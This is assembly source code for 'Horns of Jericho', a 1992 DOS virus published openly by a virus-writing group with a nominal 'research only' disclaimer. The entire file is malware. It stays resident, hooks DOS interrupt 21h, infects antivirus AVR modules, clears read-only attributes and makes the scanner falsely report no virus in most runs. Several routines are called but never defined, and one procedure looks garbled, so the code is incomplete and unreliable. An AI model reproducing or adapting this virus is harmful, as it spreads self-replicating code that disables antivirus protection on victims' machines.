;*** HORNS OF JERICHO/AVR-VIR VIRUS SOURCE CODE ***
; (c) 1992 Crom-Cruach / TRIDENT Virus Research Group
;
; Actual virus size: 624 bytes
;
;- Research only, of course.
;- Don't be lame by changing the name, please
;
;  This virus is a high memory resident infector of AVR files.
;  It disables scanning by the AVR 3 out of 4 times (random)
;
;  Date/time are saved & it overrides the R/O flag.
;
;  MAKERES is the code called by TB-Scan
;  NEW21 is the I21 handler
;
;  Written in A86 assembly
;
;  Greetz 2 - NuKE, Phalcon/SKISM, YAM & Demoralized Youth
;  Gruntz (might be destructive) 2 all lamers, see above
;
;  I included a FAKE Avr module which doesn't detect Coffeeshop-3,
;  not to spread worldwide, ofcourse, but to show how it infects.

Start:          jmp long EndMem         ; Jump is replaced by '[Ho'

                db 'rns Of Jericho (c) 92 Crom-Cruach/Trident]'


;*** Executed by scanner, installs I21 handler ***

MakeRes:        cld
                xor di,di
                mov ds,di
                mov dx,[086]                    ; Get seg I21
                mov bp,[046C]                   ; Get random nr.
                mov ax,044A0                    ; Already installed?
                int 021
                cmp ah,0FF                      ; Yep, leave
                je Restore

                mov ah,062                      ; Get curr. PSP ofs
                int 021
                xchg bx,ax                      ; MOV AX,BX (but 1 byte)

                cmp ax,si                       ; Prog-MCB-Seg < I21 seg?
                jb Restore                      ; Yes; Quit

                dec ax
LoopMCB:        mov ds,ax

                cmp byte ptr [di],'Z'           ; [0] (but it's shorter)
                je Got_EndMCB
                add ax,[di+3]                   ; [3] (^^)
                inc ax
                jmp short LoopMCB

Got_EndMCB:     mov bx,[di+3]                   ; [3]

                cmp bx,VirPars+01000            ; Place for vir + 64K spare?
                jb Restore
                sub bx,VirPars                  ; Yep

                mov [di+3],bx                   ; [3]; Decrease memory

                add ax,bx
                sub ax,(offset StartPar-1)      ; - startpar + 1 (MCB_par)
                mov es,ax                       ; ES = seg high-mem for vir

                push cs
                pop ds
                mov cx,VirSize

HereVirOfs:     mov si,offset Start
                mov di,offset Start
                repz movsb                      ; Move vir naar high mem

                mov ds,cx                       ; cx is zero
                mov ax,[084]
                mov word ptr es:[I21Adr],ax
                mov word ptr es:[I21Adr+2],dx   ; already asked at begin
                cli
                mov word ptr [084],offset New21
                mov [086],es
                sti

Restore:
                test bp,3
                jz GoAVR                    ; Exec. AVR only 1 out of 4 times
                clc
                retf 0A                 ; Tell scanner - no virus found.
GoAVR:
                mov si,048                      ; Entry point of AVR
                push cs
                pop ds
                sub word ptr [03C],WholePars
                mov di,[03C]                    ; Size of real AVR

                pop [di+offset ReturnAVRAddr-offset Start] ;Save addr. scanner
                pop [di+offset ReturnAVRAddr-offset Start+2]

                push cs                         ; New AVR-return address
                add di,offset AfterAVR-offset Start
                push di
                mov word ptr [si],020CDh    ; Restore orig. AVR bytes
Min2Org:        mov byte ptr [si+2],090     ; (Now: return to DOS I20)
Min1Org:        jmp si


;*** Misc. procedures ***

ReadFile:       push ax                         ; Read part of AVR file
                mov ah,03F
                mov dx,offset RdBuf
                int 021                         ; bx must be handle
                cmp ax,cx                       ; Return carry if read<8000)
                int 021                 ; BX must be file handle
                pop dx
                pop cx
                ret


;*** Saved data - The filehandle (FFFF = no file)

FHandle         dw 0FFFF




;****** NEW I21 HANDLER ******

New21:

;--- If ax = 44A0: Ah->FF; is sign: Vir already installed ---

                cmp ax,044A0
                jne NoF
                cbw             ; Al is signed; AH -> FF
                iret

;--- On 3D-Open, check if file is AVR, & if so, save handle ---

NoF:            cmp ah,3Dh              ; Read?
                jne Close
                test al,3
                jnz Go21                ; He wanted to write as well!
                cmp cs:FHandle,0FFFF
                jne Go21                ; Already a file traced
                push ds
                call SaveRegs
                pop ds
                cld
                mov si,dx
                cmp word ptr [si],':C'          ; file on c-drive?
                jne JDos                      ; No; quit
SrchEnd:        lodsb                           ; end of filename
                cmp al,0
                jne SrchEnd
                cmp word ptr [si-5],'A.'        ; .A?
                jne JDos
                cmp word ptr [si-3],'RV'        ; VR?
                jne JDos

;*** Clear R/O flag ***
                mov ax,04300                    ; Get file attr.
                int 021
                jc JDos
                mov cs:Attr,cx
                test cl,1
                jz IsOk                         ; No R/O flag set
                mov ax,04301
                and cl,0FE                      ; Clear flag
                int 021
                jc JDos
IsOk:
                call GetRegs
                or al,2                         ; Read & write!
                int 021                         ; Try opening file
                pushf
                push ax
                push cx
                mov ax,04301
                mov cx,cs:Attr
                int 021
                pop cx
                pop ax
                popf
                jnc Save_Handle                   ; Err, Quit&Try open w/o write
JDos:           jmp short Go2Dos
Save_Handle:    mov cs:FHandle,ax
                retf 2


;--- On 3E-Close, infect AVR if not already infected ---

Close:          cmp ah,03E                      ; Close?
                jne Go21                        ; No, quit
                cmp bx,cs:FHandle               ; Is traced AVR module?
                je SameFile                     ; No, quit
Go21:           jmp i21Jmp
SameFile:       mov word ptr cs:FHandle,0FFFF   ; Clear FHandle
                call SaveRegs
                call GoBegFile
                mov cx,050
                call ReadFile
                jb Go2Dos                    ; Can't be <50h bytes.

;Test if file is a good AVR file
                mov si,dx                       ; ofs. RdBuf

                cmp byte ptr [si+048],0E9       ; Infected?
                je Go2Dos                            ; Yeah, quit

                cmp byte ptr [si+041],0         ; Check first 0
Ne_Ret:         jne Go2Dos
                cmp word ptr [si+042],1         ; Check 1 0
                jne Go2Dos

;Write jump to end-of-AVR
                mov ax,word ptr [si+048]        ; Save org. bytes
                mov [Min2Org-2],ax
                mov al,byte ptr [si+04A]
                mov [Min1Org-1],al

                mov ax,word ptr [si+03C]        ; Length of AVR
                test al,0F                              ; Not /16?
                jz No_ret
Go2Dos:         jmp short Quit2Dos

No_Ret:
                add word ptr [si+03C],WholePars ; Add size of virus

                mov [HereVirOfs+1],ax           ; Write ofs of virus (for move)

                mov di,ax
                sub di,cx                       ; DI = bytes still to read

                mov byte ptr [si+048],0E9
                add ax,offset MakeRes-offset Start-048-3 ; set jmp 2 vir
                mov [si+049],ax              ; jump on start
                mov [offset ReturnAVR-2],ax             ; restore-jump

                call GoBegFile

                mov ah,040                      ; Write header, with JMP added
                int 021                         ; cx still 50h, dx still RdBuf

                xor ax,ax                       ; chksum 0


;*** CSUM Calculate. Here of file - result in AX ***

LoopCode:
                call MakeSum
                mov si,dx
                mov cx,di
                jcxz DoneRead

ReadMore:       cmp cx,0100             ; Buffer = 100h bytes
                jna NoMore
                mov cx,0100
NoMore:         sub di,cx
                call ReadFile
                jmp short LoopCode


;*** And of virus itself ***

DoneRead:       mov si,offset Start
                mov cx,offset WholePars-2
                mov dx,si
                call MakeSum

                mov word ptr [si],ax      ; Save sum
                mov ah,040
                mov cx,offset WholePars
                int 021

;*** And preserve file date/time

                mov ax,05700
                int 021
                mov ax,05701
                int 021

Quit2Dos:       call GetRegs                    ; Go interrupt, restore regs
I21Jmp:         db 0EA                          ; JMP FAR
I21Adr          dw 0,0


;*** After the execution of the org. AVR, it jumps to here ***

AfterAVR:       add word ptr cs:[03C],WholePars ; restore to AVR+Virsize
                mov byte ptr cs:[048],0E9       ; JMP long
                mov word ptr cs:[049],01234     ; Filled next infection
ReturnAVR:      db 0EA                          ; jump back to scanner

EndVir:                                 ;*** END OF WRITTEN VIRUS ***

ReturnAVRAddr   dw 0,0

RdBuf           db 0100 dup (?)         ;*** ... DATA ONLY IN MEMORY ***

SaveAx          dw 0
SaveCx          dw 0
SaveDx          dw 0
SaveSi          dw 0
SaveDi          dw 0
SaveDs          dw 0

ReadSize        dw 0

Attr            dw 0


EndMem:                                 ; *** END OF MEMORY DATA ***

;*** This code is only executed for installing the 'mother' into memory.
; It is not a real part of the virus code.

                mov byte ptr [Start],'['
                mov word ptr [Start+1],'oH'
                mov ax,0FFFF
                int 021
                cmp ah,0FE
                je NoInit
                mov ax,03521
                int 021
                mov [I21Jmp+1],bx
                mov [I21Jmp+3],es
                mov ax,02521
                mov dx,offset New21
                int 021
                mov ax,03100
                mov dx,VirPars+010      ; Also PSP required
                int 021
NoInit:         ret


VirSize         equ (offset EndVir-offset Start)

VirPars         equ (offset EndMem-offset Start+0F) shr 4 ; pars of memory required

StartPar        equ offset Start shr 4


WholePars       equ ((offset EndVir-offset Start+2+0F) shr 4) shl 4
    ; whole pars, 2 bytes CSUM
    